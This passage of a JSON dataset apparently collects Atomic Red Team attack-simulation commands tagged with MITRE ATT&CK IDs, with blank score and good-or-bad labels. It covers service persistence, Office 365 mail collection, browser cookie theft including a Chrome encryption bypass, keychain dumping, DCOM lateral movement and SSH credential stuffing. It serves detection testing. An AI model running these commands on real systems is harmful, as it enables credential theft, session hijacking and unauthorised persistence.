        "ID": 348,
        "Command": "powershell.exe Get-Service",
        "Description": "Executes the Get-Service cmdlet to gather objects representing all services on the local system.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1007",
        "Shell": "command_prompt"
    },
    {
        "ID": 349,
        "Command": "echo \"[Unit]\" > /etc/systemd/system/art-systemd-service.service\necho \"Description=Atomic Red Team Systemd Service\" >> /etc/systemd/system/art-systemd-service.service\necho \"\" >> /etc/systemd/system/art-systemd-service.service\necho \"[Service]\" >> /etc/systemd/system/art-systemd-service.service\necho \"Type=simple\"\necho \"ExecStart=/bin/touch /tmp/art-systemd-execstart-marker\" >> /etc/systemd/system/art-systemd-service.service\necho \"ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker\" >> /etc/systemd/system/art-systemd-service.service\necho \"ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker\" >> /etc/systemd/system/art-systemd-service.service\necho \"ExecReload=/bin/touch /tmp/art-systemd-execreload-marker\" >> /etc/systemd/system/art-systemd-service.service\necho \"ExecStop=/bin/touch /tmp/art-systemd-execstop-marker\" >> /etc/systemd/system/art-systemd-service.service\necho \"ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker\" >> /etc/systemd/system/art-systemd-service.service\necho \"\" >> /etc/systemd/system/art-systemd-service.service\necho \"[Install]\" >> /etc/systemd/system/art-systemd-service.service\necho \"WantedBy=default.target\" >> /etc/systemd/system/art-systemd-service.service\nsystemctl daemon-reload\nsystemctl enable art-systemd-service.service\nsystemctl start art-systemd-service.service\n",
        "Description": "This test creates a Systemd service unit file and enables it as a service.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1543.002",
        "Shell": "bash"
    },
    {
        "ID": 350,
        "Command": "echo '#\\!/bin/sh' > /usr/local/etc/rc.d/art-test\necho ' ' >> /usr/local/etc/rc.d/art-test\necho '#' >> /usr/local/etc/rc.d/art-test\necho '# PROVIDE: art-test' >> /usr/local/etc/rc.d/art-test\necho '# REQUIRE: LOGIN' >> /usr/local/etc/rc.d/art-test\necho '# KEYWORD: shutdown' >> /usr/local/etc/rc.d/art-test\necho ' ' >> /usr/local/etc/rc.d/art-test\necho '. /etc/rc.subr' >> /usr/local/etc/rc.d/art-test\necho ' ' >> /usr/local/etc/rc.d/art-test\necho 'name=\"art_test\"' >> /usr/local/etc/rc.d/art-test\necho 'rcvar=art_test_enable' >> /usr/local/etc/rc.d/art-test\necho 'load_rc_config ${name}' >> /usr/local/etc/rc.d/art-test\necho 'command=\"/usr/bin/touch\"' >> /usr/local/etc/rc.d/art-test\necho 'start_cmd=\"art_test_start\"' >> /usr/local/etc/rc.d/art-test\necho '' >> /usr/local/etc/rc.d/art-test\necho 'art_test_start()' >> /usr/local/etc/rc.d/art-test\\t \necho '{' >> /usr/local/etc/rc.d/art-test\necho '  ${command} /tmp/art-test.marker' >> /usr/local/etc/rc.d/art-test\necho '}' >> /usr/local/etc/rc.d/art-test\necho ' ' >> /usr/local/etc/rc.d/art-test\\t \necho 'run_rc_command \"$1\"' >> /usr/local/etc/rc.d/art-test\nchmod +x /usr/local/etc/rc.d/art-test\nservice art-test enable\nservice art-test start\n",
        "Description": "This test creates a SysV service unit file and enables it as a service.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1543.002",
        "Shell": "sh"
    },
    {
        "ID": 351,
        "Command": "echo \"#!/bin/bash\" > /etc/init.d/T1543.002\necho \"### BEGIN INIT INFO\" >> /etc/init.d/T1543.002\necho \"# Provides : Atomic Test T1543.002\" >> /etc/init.d/T1543.002\necho \"# Required-Start: \\$all\" >> /etc/init.d/T1543.002\necho \"# Required-Stop : \" >> /etc/init.d/T1543.002\necho \"# Default-Start: 2 3 4 5\" >> /etc/init.d/T1543.002\necho \"# Default-Stop: \" >> /etc/init.d/T1543.002\necho \"# Short Description: Atomic Test for Systemd Service Creation\" >> /etc/init.d/T1543.002\necho \"### END INIT INFO\" >> /etc/init.d/T1543.002\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \\\" \" >> /etc/init.d/T1543.002\nchmod +x /etc/init.d/T1543.002\nif [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi\nsystemctl enable T1543.002\nsystemctl start T1543.002\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a /etc/init.d/T1543.002\nsystemctl daemon-reload\nsystemctl restart T1543.002\n",
        "Description": "This test creates a systemd service unit file and enables it to autostart on boot. Once service is created and enabled, it also modifies this same service file showcasing both Creation and Modification of system process. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1543.002",
        "Shell": "bash"
    },
    {
        "ID": 352,
        "Command": "$ss = ConvertTo-SecureString \"\" -AsPlainText -Force\n$cred = New-Object PSCredential -ArgumentList '', $ss\n$param = @{\n\\tCredential = $cred\n\\tForce\\t  = $true\n}\n$null = Connect-AzAccount @param\n$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token\n$cert = New-SelfSignedCertificate -Subject \"CN=PowerShell Application\" -CertStoreLocation \"Cert:\\CurrentUser\\My\" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256\n$reqResourceAccess = ( @{ \"resourceAccess\" = (@{\"id\"= \"570282fd-fa5c-430d-a7fd-fc8dc98a9dca\"; \"type\"= \"Scope\"}, @{ \"id\"= \"7427e0e9-2fba-42fe-b0c0-848c9e6a8182\"; \"type\"= \"Scope\"}, @{\"id\"= \"37f7f235-527c-4136-accd-4a02d197296e\"; \"type\"= \"Scope\"}, @{\"id\"= \"14dad69e-099b-42c9-810b-d002981feec1\"; \"type\"= \"Scope\"}, @{ \"id\"= \"e1fe6dd8-ba31-4d61-89e7-88639da4683d\"; \"type\"= \"Scope\"}, @{ \"id\"= \"810c84a8-4a9e-49e6-bf7d-12d183f40d01\"; \"type\"= \"Role\"}); \"resourceAppId\" = \"00000003-0000-0000-c000-000000000000\" })\nconnect-mggraph -AccessToken $token\n$context = Get-MgContext\\t   \n$users = get-MgUser\n$app = New-MgApplication -DisplayName \"T1114.002 Atomic Test #1 - Office365 - Remote Email Collection\" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=\"http://localhost\"; } -KeyCredentials @(@{ Type=\"AsymmetricX509Cert\"; Usage=\"Verify\"; Key=$cert.RawData })\nNew-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null\n$resourceSPN = Get-MgServicePrincipal -Filter \"AppId eq '$($app.AppId)'\"\n$graphApiApp = Get-MgServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq \"Mail.Read\"\nNew-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id\n$mailbox1 = \"\"\n$mailbox2 = \"\"\n$mailbox3 = \"\"\n[System.Collections.ArrayList]$selectUsers = @()\nforeach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}\nconnect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name\nforeach ($user in $selectUsers) { $url= \"https://graph.microsoft.com/v1.0/users/$($user)/messages\" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}\n",
        "Description": "Create and register an entra application that downloads emails from a tenant's Office 365 mailboxes using the Microsoft Graph API app-only access. This can be used by an adversary to collect an organization's sensitive information. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1114.002",
        "Shell": "powershell"
    },
    {
        "ID": 353,
        "Command": "export AWS_REGION=us-west-2\ncd $PathToAtomicsFolder/T1580/src\necho \"Stratus: Start Warmup.\"\n./stratus warmup aws.discovery.ec2-enumerate-from-instance\necho \"Stratus: Start Detonate.\"\n./stratus detonate aws.discovery.ec2-enumerate-from-instance\n",
        "Description": "This atomic runs several API calls (sts:GetCallerIdentity, s3:ListBuckets, iam:GetAccountSummary, iam:ListRoles, iam:ListUsers, iam:GetAccountAuthorizationDetails, ec2:DescribeSnapshots, cloudtrail:DescribeTrails, guardduty:ListDetectors) from the context of an EC2 instance role. This simulates an attacker compromising an EC2 instance and running initial discovery commands on it. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1580",
        "Shell": "sh"
    },
    {
        "ID": 354,
        "Command": "aws ec2 describe-security-groups --profile default --output json\n",
        "Description": "Simulate an attacker's action to enumerate EC2 Security Groups in a compromised AWS environment.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1580",
        "Shell": "command_prompt"
    },
    {
        "ID": 355,
        "Command": "ps >> /tmp/loot.txt\nps aux >> /tmp/loot.txt\n",
        "Description": "Utilize ps to identify processes.\n\nUpon successful execution, sh will execute ps and output to /tmp/loot.txt.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1057",
        "Shell": "sh"
    },
    {
        "ID": 356,
        "Command": "tasklist\n",
        "Description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1057",
        "Shell": "command_prompt"
    },
    {
        "ID": 357,
        "Command": "Get-Process\n",
        "Description": "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1057",
        "Shell": "powershell"
    },
    {
        "ID": 358,
        "Command": "get-wmiObject -class Win32_Process\n",
        "Description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1057",
        "Shell": "powershell"
    },
    {
        "ID": 359,
        "Command": "wmic process get /format:list\n",
        "Description": "Utilize windows management instrumentation to identify processes.\n\nUpon successful execution, WMIC will execute process to list processes. Output will be via stdout. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1057",
        "Shell": "command_prompt"
    },
    {
        "ID": 360,
        "Command": "tasklist | findstr lsass\n",
        "Description": "Adversaries may use command line tools to discover specific processes in preparation of further attacks. \nExamples of this could be discovering the PID of lsass.exe to dump its memory or discovering whether specific security processes (e.g. AV or EDR) are running.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1057",
        "Shell": "command_prompt"
    },
    {
        "ID": 361,
        "Command": "Start-Process -FilePath \"$Env:ProgramFiles\\Process Hacker 2\\ProcessHacker.exe\"",
        "Description": "Process Hacker can be exploited to infiltrate system processes, identify weak points, or achieve unauthorized control over systems. However, its malicious use can often be flagged by security defenses, rendering it a perilous tool for illegitimate purposes.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1057",
        "Shell": "powershell"
    },
    {
        "ID": 362,
        "Command": "Start-Process -FilePath \"C:\\Temp\\ExternalPayloads\\PCHunter_free\\PChunter64.exe\"",
        "Description": "PC Hunter is a toolkit with access to hundreds of settings including kernels, kernel modules, processes, network, startup, and more. When abused, this tool can allow threat actors to effectively access sensitive processes, collect system information, and terminate security software.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1057",
        "Shell": "powershell"
    },
    {
        "ID": 363,
        "Command": "taskmgr.exe /7\n",
        "Description": "An adverary may launch taskmgr.exe with the /7 switch via command prompt to view processes running on the system.\n[Reference](https://github.com/trellix-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Conti_Ransomware.yml)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1057",
        "Shell": "command_prompt"
    },
    {
        "ID": 364,
        "Command": "mkdir $HOME/...\ncp $(which sh) $HOME/...\n$HOME/.../sh -c \"echo Hello from the Atomic Red Team test T1036.005#1\"\n",
        "Description": "Create and execute a process from a directory masquerading as the current parent directory (`...` instead of normal `..`)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.005",
        "Shell": "sh"
    },
    {
        "ID": 365,
        "Command": "Add-Type -TypeDefinition @'\npublic class Test {\n\\tpublic static void Main(string[] args) {\n\\t\\tSystem.Console.WriteLine(\"tweet, tweet\");\n\\t}\n}\n'@ -OutputAssembly \"$Env:windir\\Temp\\svchost.exe\"\n\nStart-Process -FilePath \"$Env:windir\\Temp\\svchost.exe\"\n",
        "Description": "Launch an executable that attempts to masquerade as a legitimate executable.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.005",
        "Shell": "powershell"
    },
    {
        "ID": 366,
        "Command": "sc.exe stop spooler\n",
        "Description": "Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying\nit has changed to a state of STOP_PENDING. If the spooler service was not running \"The service has not been started.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1489",
        "Shell": "command_prompt"
    },
    {
        "ID": 367,
        "Command": "net.exe stop spooler\n",
        "Description": "Stops a specified service using the net.exe command. Upon execution, if the service was running \"The Print Spooler service was stopped successfully.\"\nwill be displayed. If the service was not running, \"The Print Spooler service is not started.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1489",
        "Shell": "command_prompt"
    },
    {
        "ID": 368,
        "Command": "taskkill.exe /f /im spoolsv.exe\n",
        "Description": "Stops a specified service killng the service's process.\nThis technique was used by WannaCry. Upon execution, if the spoolsv service was running \"SUCCESS: The process \"spoolsv.exe\" with PID 2316 has been terminated.\"\nwill be displayed. If the service was not running \"ERROR: The process \"spoolsv.exe\" not found.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1489",
        "Shell": "command_prompt"
    },
    {
        "ID": 369,
        "Command": "sudo systemctl stop cron\n",
        "Description": "Stops a specified service using the systemctl command.\nUpon execution, if the specified service was running, it will change to a state of inactive and it can be restarted by running the cleanup command.\nYou can list all available services with following command: \"systemctl list-units --type=service\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1489",
        "Shell": "sh"
    },
    {
        "ID": 370,
        "Command": "sudo killall -SIGTERM cron\n",
        "Description": "Stops a specified service by sending a SIGTERM signal to the linked process using the killall command.\nUpon execution, if the service's main process was running, it will be terminated.\nIf the service was not running, no process will be found to kill and it can be restarted by running the cleanup command.\nYou can list all available services with following command: \"systemctl list-units --type=service\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1489",
        "Shell": "sh"
    },
    {
        "ID": 371,
        "Command": "sudo kill -SIGTERM $(pgrep cron)\n",
        "Description": "Stops a specified service by sending a SIGTERM signal to the linked process using the kill command. Upon execution, if the service's main process was running, it will be terminated.\nIf the service was not running, no process will be found to kill and it can be restarted by running the cleanup command.\nYou can list all available services with following command: \"systemctl list-units --type=service\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1489",
        "Shell": "sh"
    },
    {
        "ID": 372,
        "Command": "sudo pkill -SIGTERM ^cron$\n",
        "Description": "Stops a specified service by sending a SIGTERM signal to the linked process using pkill. This method is effective when multiple instances of the process may be running.\nUpon execution, if any instances of the process were running, they will be terminated. If no instances were running, pkill will not find any processes to kill.\nStopped service can be restarted by running the cleanup command.\nYou can list all available services with following command: \"systemctl list-units --type=service\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1489",
        "Shell": "sh"
    },
    {
        "ID": 373,
        "Command": "Start-Process \"PathToAtomicsFolder\\T1027.007\\bin\\ninja_syscall1.exe\"\nStart-Sleep -Seconds 7\nif (Test-Path \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\") { Remove-Item \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\" -Force; Write-Host \"[+] hello.log removed.\" }\n",
        "Description": "This test calls NtCreateFile via API hashing and dynamic syscall resolution. I have dubbed this particular combination of techniques 'Ninja-syscall'. When successful, a new file named 'hello.log' will be created in the default user's temporary folder, which is a common location for a dropper.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027.007",
        "Shell": "powershell"
    },
    {
        "ID": 374,
        "Command": "stop-process -name \"firefox\" -force -erroraction silentlycontinue\n$CookieDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\"\n\"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];\" | cmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe \"$CookieDBLocation\" | out-file -filepath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1539FirefoxCookies.txt\"\n",
        "Description": "This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. \nNote: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1539",
        "Shell": "powershell"
    },
    {
        "ID": 375,
        "Command": "stop-process -name \"chrome\" -force -erroraction silentlycontinue\n\"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\" | cmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\" | out-file -filepath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt\"\n",
        "Description": "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1539",
        "Shell": "powershell"
    },
    {
        "ID": 376,
        "Command": "killall 'Google Chrome'\nsleep 1\nopen -a \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/\nsleep 1\n/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337",
        "Description": "The remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.\n\nIf successful, this test will output a list of cookies.\n\nNote: Chrome processes will be killed during this test.\n\nSee https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1539",
        "Shell": "bash"
    },
    {
        "ID": 377,
        "Command": "$devToolsPort = 9222\n$testUrl = \"https://www.google.com\"\nstop-process -name \"chrome\" -force -erroraction silentlycontinue\n$chromeProcess = Start-Process \"chrome.exe\" \"$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default\" -PassThru\nStart-Sleep 10\n$jsonResponse = Invoke-WebRequest \"http://localhost:$devToolsPort/json\" -UseBasicParsing\n$devToolsPages = ConvertFrom-Json $jsonResponse.Content\n$ws_url = $devToolsPages[0].webSocketDebuggerUrl\n$ws = New-Object System.Net.WebSockets.ClientWebSocket\n$uri = New-Object System.Uri($ws_url)\n$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()\n$GET_ALL_COOKIES_REQUEST = '{\"id\": 1, \"method\": \"Network.getAllCookies\"}'\n$buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)\n$segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length\n$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()\n$completeMessage = New-Object System.Text.StringBuilder\ndo {\n\\t$receivedBuffer = New-Object byte[] 2048\n\\t$receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length\n\\t$result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result\n\\t$receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)\n\\t$completeMessage.Append($receivedString)\n} while (-not $result.EndOfMessage)\n$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, \"Closing\", [System.Threading.CancellationToken]::None).Wait()\ntry {\n\\t$response = ConvertFrom-Json $completeMessage.ToString()\n\\t$cookies = $response.result.cookies\n} catch {\n\\tWrite-Host \"Error parsing JSON data.\"\n}\nWrite-Host $cookies\nStop-Process $chromeProcess -Force",
        "Description": "Chrome v127+ uses app-bound encryption to protect cookies. This test bypasses that protection to obtain the cookies. If successful, the test outputs cookie values to the console.\nNote: Will stop any instances of Chrome already running\nAdapted from https://embracethered.com/blog/posts/2024/cookie-theft-in-2024-and-what-todo",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1539",
        "Shell": "powershell"
    },
    {
        "ID": 378,
        "Command": "osascript -e 'tell application \"Finder\"' -e 'set destinationFolderPath to POSIX file \"/private/tmp\"' -e 'set safariFolder to ((path to library folder from user domain as text) & \"Containers:com.apple.Safari:Data:Library:Cookies:\")' -e 'duplicate file \"Cookies.binarycookies\" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'",
        "Description": "This command will copy Safari BinaryCookies files using AppleScript as seen in Atomic Stealer.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1539",
        "Shell": "sh"
    },
    {
        "ID": 379,
        "Command": "powershell.exe -c \"Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }\"\n",
        "Description": "This test simulates an attack where PowerShell is used to detect connected USB or other removable storage devices and gather a list of specific document files \n(e.g., .docx, .xls, .txt, .pdf). The command works by first identifying removable drives on the system and then recursively searching through each one for files \nmatching the targeted extensions. If no removable drives are present, the script will return a message stating that no media is detected. This behavior mimics \nhow adversaries might scan for sensitive documents on removable devices for exfiltration or analysis.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1025",
        "Shell": "command_prompt"
    },
    {
        "ID": 380,
        "Command": "yes > /dev/null\n",
        "Description": "This test simulates a high CPU load as you might observe during cryptojacking attacks.\nEnd the test by using CTRL/CMD+C to break.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1496",
        "Shell": "sh"
    },
    {
        "ID": 381,
        "Command": "sudo security dump-keychain -d login.keychain",
        "Description": "This command will dump keychain credential information from login.keychain. \nSource: https://www.loobins.io/binaries/security/\n\n### Keychain File path\n  ~/Library/Keychains/\n  /Library/Keychains/\n  /Network/Library/Keychains/\n  [Security Reference](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/security.1.html)\n  ",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.001",
        "Shell": "sh"
    },
    {
        "ID": 382,
        "Command": "security find-certificate -a -p > /tmp/certs.pem\n",
        "Description": "This command finds all certificate items and sends the output to local file in pem format.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.001",
        "Shell": "sh"
    },
    {
        "ID": 383,
        "Command": "security import /tmp/certs.pem -k\n",
        "Description": "This command will import a certificate pem file into a keychain.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.001",
        "Shell": "sh"
    },
    {
        "ID": 384,
        "Command": "cat ~/Library/Keychains/login.keychain-db > /tmp/keychain\n",
        "Description": "This command will copy the keychain using the cat utility in a manner similar to Atomic Stealer.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.001",
        "Shell": "sh"
    },
    {
        "ID": 385,
        "Command": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"localhost\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")\n",
        "Description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.003",
        "Shell": "powershell"
    },
    {
        "ID": 386,
        "Command": "copy c:\\windows\\system32\\calc.exe 'C:\\users\\admin\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'\n$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"localhost\"))\n$com.ActivateMicrosoftApp(\"5\")\n",
        "Description": "Powershell lateral movement using the Excel COM objects.\n\nReference:\n\nhttps://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.003",
        "Shell": "powershell"
    },
    {
        "ID": 387,
        "Command": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@localhost;done\n",
        "Description": "Using username,password combination from a password dump to login over SSH.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.004",
        "Shell": "bash"
    },
    {
        "ID": 388,
        "Command": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@localhost;done\n",
        "Description": "Using username,password combination from a password dump to login over SSH.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.004",
        "Shell": "bash"
    },
    {
        "ID": 389,
        "Command": "cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@localhost;done\n",
        "Description": "Using username,password combination from a password dump to login over SSH.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.004",
        "Shell": "sh"
    },
    {
        "ID": 390,
        "Command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteforce --dc $ENV:userdnsdomain -d $ENV:userdomain \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"\\t  \n",
        "Description": "Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.004",
        "Shell": "powershell"
    },
    {
        "ID": 391,
        "Command": "$archive=\"$env:PUBLIC\\T1649\\atomic_certs.zip\"\n$exfilpath=\"$env:PUBLIC\\T1649\\certs\"\nAdd-Type -assembly \"system.io.compression.filesystem\"\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore\nmkdir $exfilpath | Out-Null\nforeach ($cert in (gci Cert:\\CurrentUser\\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\\$($cert.FriendlyName).cer}\n[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)\n",
        "Description": "Export all user certificates and add to a compressed archive.\n",
        "Score": null,
        "GoodOrBad": null,
